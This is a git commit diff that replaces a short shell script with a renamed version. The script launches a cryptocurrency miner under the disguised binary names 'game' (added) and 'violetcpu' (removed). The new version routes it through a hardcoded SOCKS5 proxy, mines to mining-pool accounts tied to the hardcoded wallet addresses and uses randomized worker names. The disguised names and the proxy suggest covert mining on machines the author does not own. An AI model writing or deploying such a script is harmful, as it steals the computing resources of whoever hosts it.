5f14d620a998751d663f1ca71b941485b5a58f1f
angkii <83603708+angkii@users.noreply.github.com>
2021-07-18 10:41:12 +0700

    Update and rename savagee.sh to savage.sh

---
+++ savage.sh
@@ -0,0 +1,11 @@
+POOL=rx.unmineable.com:3333
+
+WALLET=SHIB:0xb13f91835c32249e1506da1201e937d666652725
+
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-MJ-)
+
+PROXY=socks5://72.212.63.101:41455
+
+chmod +x game
+
+./game --pool $POOL --username $WALLET.$WORKER --password x --algorithm wrkzcoin
--- savagee.sh
+++
@@ -1,9 +0,0 @@
-POOL=randomxmonero.usa-west.nicehash.com:3380
-
-WALLET=3BsJ6cvtviyvS6tWfFWaDGHStB8pTHUrNH
-
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-MJ-)
-
-chmod +x violetcpu
-
-./violetcpu --pool $POOL --username $WALLET.$WORKER --password x --algorithm wrkzcoin
